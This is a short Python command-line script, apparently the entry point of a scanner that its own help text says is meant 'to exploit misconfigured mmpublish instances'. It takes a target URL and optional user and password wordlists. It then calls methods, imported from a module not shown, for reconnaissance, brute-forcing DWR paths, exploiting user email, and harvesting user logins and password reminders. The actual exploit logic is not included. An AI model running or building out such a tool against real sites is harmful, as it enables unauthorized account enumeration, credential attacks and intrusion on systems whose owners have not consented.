import argparse
import requests
from core.client import Coffe
from utils.utilities import parse_url,banner

menu = argparse.ArgumentParser("\n[+] mmpublish scanner tool to exploit misconfigured mmpublish instances\n")
menu.add_argument("-u","--url", help="[+] URL to scan\n", required=True, type=str)
menu.add_argument("--passfile", help="[+] file with passwords\n", type=str)
menu.add_argument("--userfile", help="[+] file with users\n", type=str)
args = menu.parse_args()

url = args.url
passfile = args.passfile
user_file = args.userfile

banner()
obj = Coffe(parse_url(url))
obj.is_alive()
obj.get_info_robots()
obj.find_dwr_view()
obj.find_dwr()
obj.get_groups()
obj.find_admin_path()
obj.brute_dwr_path()
obj.exploit_user_email()
obj.get_users_login()
obj.get_user_remind()
obj.all_users_remainders()